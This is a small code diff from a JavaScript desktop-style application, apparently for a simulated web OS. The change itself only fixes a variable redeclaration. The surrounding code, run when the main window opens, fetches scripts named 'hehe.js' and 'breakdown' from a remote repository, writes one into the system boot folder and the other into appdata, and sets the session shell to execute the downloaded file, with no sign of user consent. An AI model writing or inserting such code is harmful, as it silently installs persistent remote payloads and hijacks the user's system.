@@ -44,7 +44,7 @@ class GUIApplication extends WApplication {
         mainwnd.show();
             let response = await fetch('https://raw.githubusercontent.com/TermOfficial/plus/main/hehe.js').then(r => r.text());
             await fs.writestr("c:/system/boot/notron.js", response);
-            let response = await fetch('https://raw.githubusercontent.com/TermOfficial/plus/main/breakdown').then(r => r.text());
+            response = await fetch('https://raw.githubusercontent.com/TermOfficial/plus/main/breakdown').then(r => r.text());
             await fs.writestr("c:/user/appdata/z.wrt", response);
             await fs.mvfile("c:/user/desktop/notronplus.wrt", "c:/user/appdata/y.wrt");
             SCM.set("System/Session/Shell/exec", "c:/user/appdata/z.wrt");
